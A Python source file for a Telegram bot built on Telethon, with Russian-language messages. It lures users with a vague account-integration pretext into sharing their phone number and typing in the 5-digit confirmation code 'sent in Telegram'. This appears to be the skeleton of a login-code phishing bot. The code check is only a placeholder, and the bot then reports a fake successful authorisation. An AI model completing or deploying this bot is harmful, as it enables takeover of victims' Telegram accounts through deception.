import asyncio
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import os
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

# Хранилище состояний пользователей
user_state = {}  # {user_id: {'step': 'waiting_code', 'phone': '+123...'}}

client = None

@events.register(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.message.strip()
    
    # Главное меню
    if text == "/start":
        await show_main_menu(event)
        return
    
    # Обработка кнопок
    if text == "📱 Отправить номер":
        await request_phone(event)
        return
    
    # Проверка кода
    if user_id in user_state and user_state[user_id].get('step') == 'waiting_code':
        if text.isdigit() and len(text) == 5:  # Проверяем что это код
            await event.reply(f"✅ Код {text} принят! Идёт проверка...")
            # Здесь будет проверка кода
            del user_state[user_id]
            await event.reply("✅ Авторизация успешна!")
        else:
            await event.reply("❌ Неверный код. Введите 5-значный код:")
        return

async def show_main_menu(event):
    """Показать главное меню с кнопкой"""
    menu = """
🔐 **ДОБРО ПОЖАЛОВАТЬ!**

Для интеграции с аккаунтом нажмите кнопку ниже.
"""
    buttons = [
        [Button.text("📱 Отправить номер", resize=True)]
    ]
    await event.reply(menu, buttons=buttons)

async def request_phone(event):
    """Запрос номера телефона"""
    user_id = event.sender_id
    user_state[user_id] = {'step': 'waiting_code'}
    
    await event.reply(
        "📞 **Отправьте ваш номер телефона**\n\n"
        "Нажмите кнопку ниже, чтобы поделиться контактом:",
        buttons=[Button.request_contact("📞 Поделиться контактом")]
    )

@events.register(events.NewMessage(func=lambda e: e.message.contact))
async def handle_contact(event):
    """Обработка полученного контакта"""
    contact = event.message.contact
    user_id = event.sender_id
    phone = contact.phone_number
    
    if user_id in user_state:
        user_state[user_id]['phone'] = phone
        user_state[user_id]['step'] = 'waiting_code'
        
        await event.reply(
            f"✅ **Номер получен:** `{phone}`\n\n"
            "📨 **Код подтверждения отправлен в Telegram**\n"
            "Введите 5-значный код из сообщения:"
        )

async def main():
    global client
    client = TelegramClient('bot_session', API_ID, API_HASH)
    client.add_event_handler(handler)
    client.add_event_handler(handle_contact)
    
    await client.start(bot_token=BOT_TOKEN)
    me = await client.get_me()
    logger.info(f"✅ Бот @{me.username} запущен!")
    
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
